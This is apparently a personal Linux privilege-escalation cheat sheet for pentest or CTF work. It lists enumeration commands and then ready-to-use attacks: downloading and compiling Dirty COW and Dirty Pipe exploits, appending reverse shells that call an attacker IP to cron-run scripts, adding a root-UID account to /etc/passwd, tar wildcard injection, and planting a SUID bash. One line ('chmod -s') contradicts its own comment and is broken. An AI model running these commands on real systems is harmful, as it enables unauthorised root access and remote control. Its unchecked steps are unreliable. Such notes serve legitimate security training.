# Manual Enumeration

## Upgrade Shell

```bash
python -c 'import pty;pty.spawn("/bin/bash")'

python -c 'import pty;pty.spawn("/bin/sh")'

python3 -c 'import pty;pty.spawn("/bin/bash")'

python3 -c 'import pty;pty.spawn("/bin/sh")'
```

## Operating Environment

```bash
# kernel information
uname -a
searchsploit kernel_version

# os release information
cat /etc/os-release

# environment variables
env
set

# current user
whoami
id
hostname

# sudo permissions
sudo -l
```

If system is vulnerable to **dirty-cow**:

```bash
wget https://raw.githubusercontent.com/FireFart/dirtycow/refs/heads/master/dirty.c

# compile it on victim machine if is possible
gcc -pthread dirty.c -o dirty -lcrypt
chmod +x dirty
./dirty
```

If system is vulnerable to **dirty-pipe**:

- https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/tree/main

```bash
# compile it on victim machine if is possible
gcc -pthread exploit-2.c -o exploit-2 -lcrypt
chmod +x exploit-2

find / -perm -4000 2>/dev/null

#We must run the exploit against a SUID binary to inject and overwrite memory in a root process. So first we need to search SUID binaries on the system.

./exploit-2 SUID
```

## Users and Groups

```bash
# list users
cat /etc/passwd
cat /etc/passwd | grep "sh$"

# list groups
cat /etc/group

# check group memberships of specific users
cat /etc/group | grep <username>
```

## Users and Groups (if domain-joined)

- Check [0xBEN site](https://benheater.com/my-ctf-methodology/)

## Network Configurations

```bash
# Network Interfaces
ip address
ip a
ifconfig

# Open Ports
netstat -tanup | grep -i listen
ss -tanup | grep -i listen

# ARP Table (if pivoting to other hosts)
ip neigh
arp -a

# Routes (if pivoting to other hosts)
ip route
route
```

## Processes and Services

```bash
# Interesting Processes
ps aux --sort user
watch -n 1 "ps -aux | grep pass"

# Interesting Services
# Enumerate services
service --status-all
systemctl list-units --type=service --state=running

# Writable unit files: 
systemctl list-units --state=running --type=service | grep '\.service' | awk -v FS=' ' '{print $1}' | xargs -I % systemctl status % | grep 'Loaded:' | cut -d '(' -f 2 | cut -d ';' -f 1 | xargs -I % find % -writable 2>/dev/null
```

## Scheduled Tasks

```bash
# Enumerate scheduled tasks
crontab -l
cat /etc/cron* 2>/dev/null
cat /var/spool/cron/crontabs/* 2>/dev/null
ls -lah /etc/cron*
sudo crontab -l

grep "CRON" /var/log/syslog
grep "CRON" /var/log/cron.log
```

## SUID and Writable files

```bash
# Check for SUID binaries
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 2>/dev/null
find / -user root -type f -perm -4000 -ls 2>/dev/null

# Check for interesting / writable scripts, writable directories or files
find / -writable -type d 2>/dev/null
find /etc -writable -exec ls -l {} \; 2>/dev/null
find / -type f ( -user $(whoami) -o -group $(whoami) ) -exec ls -l {} ; 2>/dev/null

# Check for capabilities
/usr/sbin/getcap -r / 2>/dev/null
```

## Other Checks

```bash
# Check $PATH variable for current user for possible interesting locations
echo $PATH

# Read audit logs
aureport --tty | less

# Check in /home/user_name
.profile
.bashrc
.zshrc
.bash_history
.zsh_history
.ssh

# Check interesting folders
/var/www/interesting_folder
/var/mail/user_name
/opt/interesting_folder
/usr/local/interesting_folder
/usr/local/bin/interesting_folder
/usr/local/share/interesting_folder
/etc/hosts
/tmp
/mnt
/media
/etc # (check for interesting service folders, r/w config files, passwords)

# Check privilege on password file
ls -la /etc/passwd
# Check privilege on shadow file
ls -l /etc/shadow

cat /etc/issue

routel
ss -anp
cat /etc/iptables/rules.v4

dpkg -l
cat /etc/fstab
mount
lsblk
lsmod
/sbin/modinfo nome_di_uno_specifico_modulo
```

# Automated Enumeration

## unix-privesc-check

```bash
sudo apt install unix-privesc-check

unix-privesc-check standard > output.txt
```

## linpeas

- https://github.com/rebootuser/LinEnum
- https://github.com/peass-ng/PEASS-ng

# Insecure File Permissions

```bash
# search for overwritable files
find / -writable -type d 2>/dev/null
```

```bash
# control of some script that is executed either at reboot or every so many minutes
grep "CRON" /var/log/syslog
grep "CRON" /var/log/cron.log

# edit file to get reverse-shell
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $MY_IP 1234 >/tmp/f" >> file_con_permessi_elevati.sh

# or
echo 'sh -i >& /dev/tcp/$KaliIP/4444 0>&1' >> file_con_permessi_elevati.sh

nc -lnvp 1234

# alternative 1 - modify the file to add the SUID bit to the /bin/bash file
echo "chmod -s /usr/bin/bash" >> file_con_permessi_elevati.sh

# alternative 2 - you could follow this path
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> file_con_permessi_elevati.sh
ls -la /tmp/bash
/tmp/bash -p

# if it is necessary to restart (you don't always have permissions)
sudo shutdown -r now
```

## Abusing Password Authentication

If we have permissions to modify the /etc/passwd file we can add a new user:

```bash
openssl passwd w00t

echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd

su root2
```

# Insecure System Components

## Abusing Setuid Binaries and Capabilities (SUID)

- https://gtfobins.github.io/

These commands give an overview of the passwd process used to change passwords:

```bash
passwd

ps u -C passwd

grep Uid /proc/1932/status (1932 AND THE PID OF THE PROCESS)

cat /proc/1131/status | grep Uid (1131 AND THE PID OF THE USER BASH PROCESS)

ls -asl /usr/bin/passwd
```

In the case shown the _find_ utility has the SUID flag, so it is used to escalate privileges:

```bash
find /home/joe/Desktop -exec "/usr/bin/bash" -p \;
```

In the next case, we look for _capabilities_ to exploit:

```bash
/usr/sbin/getcap -r / 2>/dev/null

perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

## Abusing Sudo

Do some online research and figure out how to exploit sudo permissions.

```bash
sudo -l
```

- https://gtfobins.github.io/

# Exploiting Kernel Vulnerabilities

```bash
cat /etc/issue

uname -r

arch

searchsploit ...

searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"

scp cve-2017-16995.c joe@192.168.123.216:
```

# Wildcards with tar

- [Guida Medium](https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa)
- [Esempio macchina htb usage](https://0xdf.gitlab.io/2024/08/10/htb-usage.html)
- [Guida Wildecards HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks#id-7z)

There is a task that runs a script every so many minutes that contains the following code:

```bash
#!/bin/bash  
cd /home/kali/Desktop/TarWildCardPrivEsc/  
tar -zcf /home/kali/Desktop/TarWildCardPrivEsc/backup.tgz *
```

The * symbol makes the script vulnerable as it could create a file inside the script directory to get an elevated shell:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > shell.sh  
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1

ls -la /tmp/bash
/tmp/bash -p
```

# File Share

Search file share (e.g. on a machine reachable only by the target):

```shell
showmount -e 172.16.8.20
```

Creating (mounting) the file share:

```shell-session
root@dmz01:/tmp# mkdir DEV01
root@dmz01:/tmp# mount -t nfs 172.16.8.20:/DEV01 /tmp/DEV01
root@dmz01:/tmp# cd DEV01/
root@dmz01:/tmp/DEV01# ls
```



